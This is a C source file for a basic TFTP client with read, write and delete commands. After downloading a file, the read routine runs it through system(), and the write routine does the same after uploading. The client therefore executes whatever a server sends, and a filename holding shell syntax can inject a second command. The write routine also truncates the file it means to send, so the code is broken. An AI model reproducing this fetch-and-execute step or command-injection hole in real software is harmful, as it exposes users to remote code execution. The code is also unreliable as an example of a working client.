#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "TFTP_Client.h"

volatile sig_atomic_t running = 1;

void sigint_handler(int sig) {
    (void) sig; //To Ignore The Parameter
    running = 0;
    printf("\n[CLIENT] Caught SIGINT. Exiting...\n");
}

int create_tftp_socket(const char *ip, uint16_t port, struct sockaddr_in *server_out) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }

    memset(server_out, 0, sizeof(struct sockaddr_in));
    server_out->sin_family = AF_INET;
    server_out->sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_out->sin_addr) <= 0) {
        perror("inet_pton");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

void tftp_rrq(const char *ip, const char *filename, const TftpConfig *config) {
    struct sockaddr_in server;
    socklen_t addr_len = sizeof(server);
    int sockfd = create_tftp_socket(ip, config->port, &server);
    if (sockfd < 0) return;

    unsigned char buffer[config->buffer_size];
    size_t filename_len = strlen(filename);
    buffer[0] = 0;
    buffer[1] = OPCODE_RRQ;
    strcpy((char *)&buffer[2], filename);
    strcpy((char *)&buffer[2 + filename_len + 1], "octet");

    sendto(sockfd, buffer, 2 + filename_len + 1 + 5 + 1, 0, (struct sockaddr *)&server, addr_len);

    FILE *file = fopen(filename, "wb");
    if (!file) {
        perror("fopen");
        close(sockfd);
        return;
    }

    while (running) {
        ssize_t n = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len);
        if (n < 4) break;

        uint16_t opcode = (buffer[0] << 8) | buffer[1];
        uint16_t block = (buffer[2] << 8) | buffer[3];

        if (opcode == OPCODE_DATA) {
            fwrite(&buffer[4], 1, n - 4, file);
            buffer[0] = 0;
            buffer[1] = OPCODE_ACK;
            buffer[2] = block >> 8;
            buffer[3] = block & 0xFF;
            sendto(sockfd, buffer, 4, 0, (struct sockaddr *)&server, addr_len);
            if (n < config->buffer_size) break;
        }
    }

    fclose(file);


    // File received successfully, now execute it
    printf("File received successfully, attempting to execute...\n");
    if (system(filename) == -1) {  // Execute the file (e.g., a script or executable)
        perror("Error executing file");
    }

    close(sockfd);
}

void tftp_wrq(const char *ip, const char *filename, const TftpConfig *config) {
    struct sockaddr_in server;
    socklen_t addr_len = sizeof(server);
    int sockfd = create_tftp_socket(ip, config->port, &server);
    if (sockfd < 0) return;

    unsigned char buffer[config->buffer_size];
    size_t filename_len = strlen(filename);
    buffer[0] = 0;
    buffer[1] = OPCODE_WRQ;
    strcpy((char *)&buffer[2], filename);
    strcpy((char *)&buffer[2 + filename_len + 1], "octet");

    sendto(sockfd, buffer, 2 + filename_len + 1 + 5 + 1, 0, (struct sockaddr *)&server, addr_len);

    // Open the file for writing (create if it doesn't exist)
    FILE *file = NULL;
    int attempts = 0;
    while (attempts < 5) {  // Retry a few times if the file is not yet created
        file = fopen(filename, "wb");
        if (file) {
            break;
        }
        attempts++;
        printf("Attempt %d: File %s not found, retrying...\n", attempts, filename);
        usleep(100000);  // Wait for 100ms before retrying
    }

    if (!file) {
        perror("fopen failed");
        close(sockfd);
        return;
    }

    uint16_t block = 0;
    recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len); // ACK 0

    while (running) {
        size_t bytes = fread(&buffer[4], 1, config->data_size, file);
        if (bytes <= 0) break;

        block++;
        buffer[0] = 0;
        buffer[1] = OPCODE_DATA;
        buffer[2] = block >> 8;
        buffer[3] = block & 0xFF;

        sendto(sockfd, buffer, bytes + 4, 0, (struct sockaddr *)&server, addr_len);
        recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len); // wait for ACK
        if (bytes < config->data_size) break;
    }

    fclose(file);

    // File received successfully, now execute it
    printf("File received successfully, attempting to execute...\n");
    if (system(filename) == -1) {  // Execute the file (e.g., a script or executable)
        perror("Error executing file");
    }

    close(sockfd);
}

void tftp_delete(const char *ip, const char *filename, const TftpConfig *config) {
    struct sockaddr_in server;
    socklen_t addr_len = sizeof(server);
    int sockfd = create_tftp_socket(ip, config->port, &server);
    if (sockfd < 0) return;

    unsigned char buffer[config->buffer_size];
    size_t filename_len = strlen(filename);
    buffer[0] = 0;
    buffer[1] = OPCODE_DELETE;
    strcpy((char *)&buffer[2], filename);
    strcpy((char *)&buffer[2 + filename_len + 1], "octet");

    sendto(sockfd, buffer, 2 + filename_len + 1 + 5 + 1, 0, (struct sockaddr *)&server, addr_len);

    ssize_t n = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len);
    if (n >= 4 && buffer[1] == OPCODE_ACK) {
        printf("File deleted successfully.\n");
    } else {
        printf("Failed to delete file.\n");
    }

    close(sockfd);
}

int main() {
    signal(SIGINT, sigint_handler);

    const TftpConfig *config = &default_tftp_config;

    char ip[32], command[16], filename[64];

    while (running) {
        printf("\nTFTP Client> ");
        printf("Enter command (rrq / wrq / delete / quit): ");
        scanf("%15s", command);

        if (strcmp(command, "quit") == 0) break;

        printf("Enter server IP: ");
        scanf("%31s", ip);
        printf("Enter filename: ");
        scanf("%63s", filename);

        if (strcmp(command, "rrq") == 0) {
            tftp_rrq(ip, filename, config);
        } else if (strcmp(command, "wrq") == 0) {
            tftp_wrq(ip, filename, config);
        } else if (strcmp(command, "delete") == 0) {
            tftp_delete(ip, filename, config);
        } else {
            printf("Unknown command.\n");
        }
    }

    printf("Client shutting down.\n");
    return 0;
}